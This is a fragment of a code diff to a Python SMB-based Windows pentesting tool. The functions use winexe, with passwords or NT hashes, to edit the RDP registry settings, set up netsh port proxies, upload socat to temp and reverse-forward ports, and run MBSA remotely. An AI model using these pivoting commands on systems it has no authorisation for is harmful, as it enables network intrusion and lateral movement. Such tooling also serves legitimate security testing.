 		winexe('reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
 		smb_fwrule('del', 3389);
 		sys.exit(0)
@@ -988,10 +966,7 @@ def smb_portfwd(lport = None, rhost = None, rport = None):
 	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
 	Forward a remote port to a remote address
 	"""
-
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
-
+	
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(6)
@@ -1006,15 +981,15 @@ def smb_portfwd(lport = None, rhost = None, rport = None):
 
 	text("[*] Setting up port forwarding...")
 
-	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" %
+	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" % 
 		(lport, rport, rhost))
-
+	
 	text("[i] Connections to %s:%d are now forwarded to %s:%d" % (CONF['smb_ip'], lport, rhost, rport))
 	text("[i] Hit CTRL+C when done...")
 
 	try:
 		raw_input()
-
+	
 	except KeyboardInterrupt:
 
 		sys.stdout.write('\r')
@@ -1028,10 +1003,7 @@ def smb_revfwd(lport = None, rhost = None, rport = None):
 	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
 	Reverse-forward a remote address/port locally
 	"""
-
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
-
+	
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(6)
@@ -1058,7 +1030,7 @@ def smb_revfwd(lport = None, rhost = None, rport = None):
 	winexe('\\windows\\temp\\tar.exe xf /windows/temp/socat.tar -C /windows/temp')
 
 	text("[*] Setting up local listener...")
-	process = subprocess.Popen([ TOOLS['socat'],
+	process = subprocess.Popen([ TOOLS['socat'], 
 		'TCP-LISTEN:%d,bind=%s,reuseaddr,fork' % (lport, local_if),
 		'TCP-LISTEN:56789,reuseaddr' ])
 
@@ -1083,13 +1055,13 @@ def smb_mbsa():
 	Run MBSA on the remote host
 	"""
 
-	if CONF["threaded_mode"]:
-		text("[!] Function not available when running for several hosts.", 1)
-
-	if not os.path.exists(TOOLS['mbsa']['cab']) or sys.argv[2] == 'update':
+	if sys.argv[2] == 'update':
 		text("[*] Downloading MBSA catalog updates...")
 		download_file("http://go.microsoft.com/fwlink/?LinkId=76054", TOOLS['mbsa']['cab'])
-		text("[*] Done.")
+		text("[*] Done.", 1)
+
+	if not os.path.exists(TOOLS['mbsa']['cab']):
+		text("[!] MBSA cab file not found. To download, run '%s mbsa update'" % sys.argv[0], 1)
 
 	set_creds(3)
 	check_tool('mbsa')
@@ -1097,12 +1069,12 @@ def smb_mbsa():
 	text("[*] Preparing MBSA...")
 
 	arch = 'x86' if os_architecture() == 32 else 'x64'
-	TOOLS['mbsa']['exe'] = TOOLS['mbsa']['exe'] % arch
-	TOOLS['mbsa']['dll'] = TOOLS['mbsa']['dll'] % arch
+	TOOLS['mbsa']['exe'] = TOOLS['mbsa']['exe'].replace('$ARCH$', arch)
+	TOOLS['mbsa']['dll'] = TOOLS['mbsa']['dll'].replace('$ARCH$', arch)
 
 	import tarfile
 	archive = tarfile.open('/tmp/mbsa.tar', mode='w')
-
+	
 	try:
 		for k, v in TOOLS['mbsa'].iteritems():
 			archive.add(v, arcname=os.path.basename(v))
